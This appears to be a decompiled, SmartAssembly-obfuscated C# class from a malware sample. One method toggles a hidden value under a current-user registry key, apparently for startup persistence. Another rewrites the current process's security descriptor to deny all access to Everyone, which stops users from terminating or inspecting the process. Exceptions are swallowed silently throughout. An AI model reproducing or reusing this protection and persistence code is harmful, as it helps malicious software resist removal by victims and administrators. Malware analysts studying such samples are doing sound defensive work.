using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace orBiLhAbVg;

internal sealed class oxbvmJdGtz
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr RHNZIRLOwilQYdds, int pXZRWsVgvjgZ, [Out] byte[] QJbEGhXlufkrJPd, uint cWRhburBJFTV, out uint ymhSCuGKFUQ);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr CJhkLlDZtZkwOHLw, int FrqIloApcvHN, [In] byte[] iefYUOzNtVgkTVK);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void pkiqzrqsUXhL(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(getString_0(107409920));
			if (bool_0 && registryKey.GetValue(getString_0(107409811)) != null)
			{
				registryKey.DeleteValue(getString_0(107409811));
			}
			else
			{
				registryKey.SetValue(getString_0(107409811), getString_0(107410453));
			}
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor kkvZgmGLjSMHigk(IntPtr intptr_0)
	{
		byte[] qJbEGhXlufkrJPd = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, qJbEGhXlufkrJPd, 0u, out var ymhSCuGKFUQ);
		if ((long)ymhSCuGKFUQ > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, qJbEGhXlufkrJPd = new byte[ymhSCuGKFUQ], ymhSCuGKFUQ, out ymhSCuGKFUQ))
		{
			return null;
		}
		return new RawSecurityDescriptor(qJbEGhXlufkrJPd, 0);
	}

	private void LcfUGeoPeRmKs(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void EBXqwJymvMl()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = kkvZgmGLjSMHigk(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			LcfUGeoPeRmKs(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static oxbvmJdGtz()
	{
		Strings.CreateGetStringDelegate(typeof(oxbvmJdGtz));
	}
}
